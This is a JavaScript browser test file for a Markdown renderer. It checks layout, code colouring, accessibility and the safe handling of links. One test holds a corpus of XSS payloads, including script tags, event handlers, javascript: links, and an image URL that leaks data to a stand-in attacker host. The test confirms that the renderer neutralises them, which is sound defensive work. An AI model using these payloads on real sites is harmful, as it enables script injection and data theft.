// Markdown and code blocks in real browsers, against the proof app's /markdown: what a reply
// looks like, that hostile text does nothing, that a link says where it goes, tables and code that
// scroll inside their own boxes, copy buttons, right to left, JavaScript off, and axe in dark,
// light and on a phone.
//
//   cargo run --release -p ui-proof -- serve          # UI_PROOF_URL, default http://127.0.0.1:8090
//   UI_BROWSERS=chromium,firefox,webkit node --test tests/markdown.test.mjs
//
// UI-GENUI-024

import assert from "node:assert/strict";
import { test } from "node:test";
import { axe, inBrowsers, shot } from "./support/flow.mjs";

const PHONE = { width: 390, height: 844 };
const SECTIONS = ["#reply", "#table", "#links", "#images", "#raw", "#trusted", "#headings", "#languages", "#long", "#rtl"];

/** The page that draws `text` as Markdown. */
const render = (text, extra = "") => `/markdown/render?text=${encodeURIComponent(text)}${extra}`;

inBrowsers(({ open, browserName }) => {
  test("a reply reads as a document: headings, a list, a table, tasks, and code with colours", async () => {
    const { page, close } = await open("/markdown");
    const reply = page.locator("#md-reply");
    assert.equal(await reply.locator("h3").innerText(), "Weekly summary");
    assert.equal(await reply.locator("ol > li").count(), 3);
    assert.equal(await reply.locator("blockquote").count(), 1);
    assert.deepEqual(
      await reply.locator("input[type=checkbox]").evaluateAll((boxes) => boxes.map((b) => [b.checked, b.disabled, b.getAttribute("aria-label")])),
      [[true, true, "Done"], [false, true, "Not done"]],
    );
    assert.equal(await reply.locator("[data-slot=code-block] pre").count(), 1);
    // A keyword, a call and a plain word are not the same colour.
    const colours = await reply.locator("[data-slot=code-block] code").evaluate((code) => {
      const pick = (selector) => getComputedStyle(code.querySelector(selector)).color;
      return { keyword: pick("[data-t=k]"), call: pick("[data-t=f]"), plain: getComputedStyle(code).color };
    });
    assert.notEqual(colours.keyword, colours.plain);
    assert.notEqual(colours.keyword, colours.call);
    await shot(page, `${browserName}-markdown-reply`, "#reply");
    await close();
  });

  test("the sections stay inside the page at 390 px: a wide table and a long code block scroll in their own boxes", async () => {
    const { page, close } = await open("/markdown", { viewport: PHONE });
    assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), "no sideways scroll");
    const box = page.locator("#md-table [data-slot=markdown-table]");
    const sizes = await box.evaluate((e) => ({ scroll: e.scrollWidth, client: e.clientWidth }));
    assert.ok(sizes.scroll > sizes.client, "the table is wider than its box");
    const code = page.locator("#long pre");
    const pre = await code.evaluate((e) => ({ scroll: e.scrollWidth, client: e.clientWidth, tab: e.tabIndex }));
    assert.ok(pre.scroll > pre.client, "the code is wider than its box");
    assert.equal(pre.tab, 0, "a block that scrolls takes the keyboard");
    await shot(page, `${browserName}-markdown-390`);
    await close();
  });

  test("a table and a code block scroll with the arrow keys once they have the focus", async () => {
    const { page, close } = await open("/markdown", { viewport: PHONE });
    const box = page.locator("#md-table [data-slot=markdown-table]");
    await box.focus();
    assert.equal(await box.evaluate((e) => e.scrollLeft), 0);
    await page.keyboard.press("ArrowRight");
    await page.keyboard.press("ArrowRight");
    assert.ok((await box.evaluate((e) => Math.abs(e.scrollLeft))) > 0, "the table moved");
    const pre = page.locator("#long pre");
    await pre.focus();
    await page.keyboard.press("End");
    assert.ok((await pre.evaluate((e) => e.scrollTop + e.scrollLeft)) > 0, "the code moved");
    await close();
  });

  test("a table's numbers line up at the end of their cells, in the shape the text asked for", async () => {
    const { page, close } = await open("/markdown");
    const aligns = await page.locator("#md-table tbody tr").first().locator("td").evaluateAll((cells) => cells.map((c) => getComputedStyle(c).textAlign));
    assert.deepEqual(aligns, ["start", "end", "end"]);
    const group = page.locator("#md-table [data-slot=markdown-table]");
    assert.equal(await group.getAttribute("role"), "group");
    assert.equal(await group.getAttribute("aria-label"), "Table");
    await close();
  });

  test("a link to another site shows its host, carries rel, and a name that lies is shown for what it is", async () => {
    const { page, close } = await open("/markdown");
    const links = page.locator("#md-links a");
    const info = await links.evaluateAll((all) => all.map((a) => ({ href: a.getAttribute("href"), rel: a.getAttribute("rel"), host: a.getAttribute("data-host"), after: getComputedStyle(a, "::after").content })));
    const lying = info.find((l) => l.href === "https://attacker.example/login");
    assert.ok(lying, "the link that lies is a link");
    assert.equal(lying.rel, "noopener noreferrer nofollow");
    assert.equal(lying.host, "attacker.example");
    assert.match(lying.after, /attacker\.example/, "the host is drawn after the words");
    const userName = info.find((l) => l.href?.includes("yourbank.example@"));
    assert.equal(userName.host, "attacker.example", "the host after the user name");
    // A path on this site and a mail link have none of this.
    const local = info.find((l) => l.href === "/reports/weekly");
    assert.equal(local.rel, null);
    assert.equal(local.host, null);
    const mail = info.find((l) => l.href?.startsWith("mailto:"));
    assert.equal(mail.rel, null);
    // The script link kept its words and lost the link.
    assert.ok(!info.some((l) => /javascript:/i.test(l.href || "")));
    assert.match(await page.locator("#md-links").innerText(), /click me/);
    await close();
  });

  test("a link can open a new tab, and says so to assistive technology; a path on this site stays", async () => {
    const { page, close } = await open(render("[away](https://example.com) and [here](/reports/weekly)", "&tab=1"));
    const away = page.locator("#out a").first();
    assert.equal(await away.getAttribute("target"), "_blank");
    assert.match(await away.locator("[data-ui-sr]").innerText(), /opens in a new tab/);
    assert.equal(await page.locator("#out a").nth(1).getAttribute("target"), null);
    await close();
    const plain = await open(render("[away](https://example.com)", "&trust=trusted"));
    assert.equal(await plain.page.locator("#out a").getAttribute("target"), null, "not unless asked for");
    await plain.close();
  });

  test("pictures: none from text we do not control, and from our own site only in trusted text", async () => {
    const { page, close } = await open("/markdown");
    assert.equal(await page.locator("#md-images img").count(), 0);
    assert.match(await page.locator("#md-images").innerText(), /chart of orders|Image not shown/);
    const trusted = page.locator("#md-trusted");
    assert.equal(await trusted.locator("img").count(), 1, "the logo from this site, not the one from another");
    assert.ok(await trusted.locator("img").evaluate((img) => img.complete && img.naturalWidth > 0), "it loaded");
    const docs = trusted.locator("a").first();
    assert.equal(await docs.getAttribute("rel"), "noopener noreferrer");
    assert.equal(await docs.getAttribute("data-host"), null, "trusted text shows no host");
    await close();
  });

  test("raw HTML is only text, and nothing in a hostile reply runs or reaches another site", async () => {
    const corpus = [
      '<script>window.__ran = true</script>',
      '<img src=x onerror="window.__ran = true">',
      '<svg onload="window.__ran = true">',
      '<iframe src="https://attacker.example/frame"></iframe>',
      '<a href="javascript:window.__ran = true">x</a>',
      "[x](javascript:window.__ran = true)",
      "[x](JaVaScRiPt:window.__ran=true)",
      "![x](https://attacker.example/steal?d=secret)",
      "![x][r]\n\n[r]: https://attacker.example/pixel.png",
      '<style>*{display:none}</style>',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example">',
      '<base href="https://attacker.example/">',
      '```"><script>window.__ran = true</script>\ncode\n```',
      "| a |\n|---|\n| <img src=x onerror=window.__ran=true> |",
      "- [x] <script>window.__ran = true</script>",
      "<form action=https://attacker.example><input name=pw></form>",
    ];
    for (const trust of ["", "&trust=trusted"]) {
      for (const text of corpus) {
        const sent = [];
        const { page, close } = await open(render(text, trust), {
          before: async (p) => {
            p.on("request", (request) => {
              if (/attacker\.example/.test(request.url())) sent.push(request.url());
            });
          },
        });
        await page.waitForLoadState("load");
        const found = await page.evaluate(() => {
          const out = document.querySelector("#out");
          const bad = out.querySelectorAll("script,iframe,object,embed,style,svg,form,meta,link,base,video,audio");
          const handlers = [...out.querySelectorAll("*")].filter((e) => [...e.attributes].some((a) => /^on/i.test(a.name)));
          const hrefs = [...out.querySelectorAll("a[href]")].map((a) => a.getAttribute("href"));
          return { ran: window.__ran === true, bad: bad.length, handlers: handlers.length, hrefs, base: document.baseURI };
        });
        assert.equal(found.ran, false, `${text} ran code`);
        assert.equal(found.bad, 0, `${text} made an element`);
        assert.equal(found.handlers, 0, `${text} made a handler`);
        assert.ok(found.hrefs.every((href) => !/^\s*(javascript|data|vbscript):/i.test(href)), `${text}: ${found.hrefs}`);
        // The text is in the page's own address, so the base is read as an origin.
        assert.equal(new URL(found.base).origin, new URL(page.url()).origin, `${text} moved the base`);
        assert.deepEqual(sent, [], `${text} sent a request to another site`);
        await close();
      }
    }
  });

  test("a heading level is where the page asks it to start", async () => {
    const { page, close } = await open("/markdown");
    assert.deepEqual(await page.locator("#md-headings").locator("h1,h2,h3,h4,h5,h6").evaluateAll((all) => all.map((h) => h.tagName)), ["H4", "H5", "H6"]);
    assert.deepEqual(await page.locator("#md-reply").locator("h1,h2,h3,h4,h5,h6").evaluateAll((all) => all.map((h) => h.tagName)), ["H3"]);
    await close();
  });

  test("every language the docs use has colours, and an unknown one stays plain", async () => {
    const { page, close } = await open("/markdown");
    const counts = await page.locator("#languages [data-slot=code-block]").evaluateAll((blocks) =>
      blocks.map((b) => ({ language: b.querySelector("[data-slot=code-block-language]")?.textContent, kinds: new Set([...b.querySelectorAll("[data-t]")].map((s) => s.getAttribute("data-t"))).size })),
    );
    assert.equal(counts.length, 14);
    for (const { language, kinds } of counts) assert.ok(kinds >= 1, `${language} has colours`);
    await close();
    const plain = await open(render("```klingon\nqapla' <b>\n```"));
    assert.equal(await plain.page.locator("#out [data-t]").count(), 0);
    assert.match(await plain.page.locator("#out pre").innerText(), /qapla' <b>/);
    await plain.close();
  });

  test("a copy button puts the code on the clipboard", async () => {
    const { page, context, close } = await open("/markdown");
    if (browserName === "chromium") await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const button = page.locator("#md-reply [data-slot=code-block-bar] button");
    assert.equal(await button.getAttribute("aria-label"), "Copy code");
    await button.click();
    if (browserName === "chromium") {
      await page.waitForFunction(async () => (await navigator.clipboard.readText()).includes("SELECT city"));
    }
    await close();
  });

  test("a code block is left to right in a right-to-left page, and text follows the page", async () => {
    const { page, close } = await open(render("```sh\nls\n```", ""), { before: (p) => p.addInitScript(() => document.addEventListener("DOMContentLoaded", () => document.documentElement.setAttribute("dir", "rtl"))) });
    assert.equal(await page.locator("#out pre").evaluate((e) => getComputedStyle(e).direction), "ltr");
    await close();
    const rtl = await open("/markdown");
    const ul = rtl.page.locator("#md-rtl ul").first();
    const gap = await ul.evaluate((list) => {
      const li = list.querySelector("li").getBoundingClientRect();
      return list.getBoundingClientRect().right - li.right;
    });
    assert.ok(gap >= 16, `the bullets are on the right in right-to-left text (${gap})`);
    await rtl.close();
  });

  test("with JavaScript off the text, the table and the colours are all there", async () => {
    const { page, close } = await open("/markdown", { js: false });
    assert.equal(await page.locator("#md-reply h3").count(), 1);
    assert.equal(await page.locator("#md-table table").count(), 1);
    const colours = await page.locator("#languages [data-slot=code-block]").first().evaluate((block) => {
      const keyword = block.querySelector("[data-t=k]");
      return getComputedStyle(keyword).color !== getComputedStyle(block.querySelector("pre")).color;
    });
    assert.ok(colours, "the colours come from the page, not from a script");
    await close();
  });

  for (const [label, options] of [
    ["dark at 1440", {}],
    ["light at 1440", { light: true }],
    ["dark on a phone", { viewport: PHONE }],
    ["light on a phone", { light: true, viewport: PHONE }],
  ]) {
    test(`axe finds nothing in any section (${label})`, async () => {
      const { page, close } = await open("/markdown", options);
      for (const section of SECTIONS) assert.deepEqual(await axe(page, section), [], section);
      await close();
    });
  }

  test("the Tab key reaches each link in turn", async () => {
    const { page, close } = await open("/markdown");
    const expected = await page.locator("#md-links a[href]").evaluateAll((all) => all.map((a) => a.getAttribute("href")));
    assert.ok(expected.length >= 4);
    await page.locator("#md-links a[href]").first().focus();
    const seen = [];
    for (let at = 0; at < expected.length; at++) {
      seen.push(await page.evaluate(() => document.activeElement?.getAttribute("href")));
      await page.keyboard.press("Tab");
    }
    assert.deepEqual(seen, expected);
    await close();
  });
});
